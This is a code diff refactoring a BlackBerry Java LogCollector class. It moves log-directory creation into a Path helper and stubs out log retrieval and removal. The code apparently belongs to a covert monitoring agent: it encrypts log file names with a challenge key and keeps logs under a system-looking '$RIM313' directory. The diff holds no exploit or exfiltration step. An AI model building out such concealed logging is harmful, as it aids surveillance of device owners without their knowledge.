@@ -35,10 +35,6 @@ public final class LogCollector implements Singleton {
 
     public static final String LOG_EXTENSION = ".mob";
 
-    public static final String LOG_DIR = "1";
-
-    public static final String MARKUP_DIR = "2";
-
     public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
     // Log Dir
     public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
@@ -83,20 +79,7 @@ public final class LogCollector implements Singleton {
         // TODO Auto-generated method stub
 
     }
-
-    public synchronized boolean createLogDir(String dirPath) {
-        /*
-         * LogNode logNode = new LogNode( dirPath + this.LOG_DIR_PREFIX +
-         * MakeDateName(), this.storeToMMC );
-         * if(!Path.CreateDirectory(logNode.dirName)) {
-         * debug.Error("Cannot create directory: "+logNode.dirName); return
-         * false; } logVector.addElement(logNode);
-         * debug.trace("Added path element: "+ logNode);
-         */
-
-        return true;
-    }
-
+    
     private String decryptName(String logMask) {
         return Encryption.decryptName(logMask, Keys.getChallengeKey()[0]);
     }
@@ -121,8 +104,9 @@ public final class LogCollector implements Singleton {
     }
 
     public Vector getLogs() {
-        // TODO Auto-generated method stub
-        return null;
+        Vector logs = new Vector();
+        
+        return logs;
     }
 
     protected synchronized int getNewProgressive() {
@@ -169,16 +153,6 @@ public final class LogCollector implements Singleton {
         return newname;
     }
 
-    public void makeLogDirs(boolean storeToMMC) {
-        if (storeToMMC) {
-            createLogDir(Path.SD_PATH);
-            createLogDir(Path.SD_PATH + LOG_DIR);
-        } else {
-            createLogDir(Path.USER_PATH);
-            createLogDir(Path.USER_PATH + LOG_DIR);
-        }
-    }
-
     public synchronized Vector makeNewName(Log log, Agent agent) {
 
         boolean onSD = agent.onSD();
@@ -198,7 +172,7 @@ public final class LogCollector implements Singleton {
                 .getChallengeKey()[0]);
 
         vector.addElement(new Integer(progressive));
-        vector.addElement(basePath + LOG_DIR); // file:///SDCard/BlackBerry/system/$RIM313/$1
+        vector.addElement(basePath + Path.LOG_DIR); // file:///SDCard/BlackBerry/system/$RIM313/$1
         vector.addElement(blockDir); // 1
         vector.addElement(encName); // ?
         return vector;
@@ -262,7 +236,12 @@ public final class LogCollector implements Singleton {
         scanForLogs(Path.USER_PATH);
 
         // costruisce le directory secondo storeToMMC
-        makeLogDirs(true);
-        makeLogDirs(false);
+        Path.makeDirs(true);
+        Path.makeDirs(false);
+    }
+
+    public void remove(String logName) {
+        // TODO Auto-generated method stub
+        
     }
 }
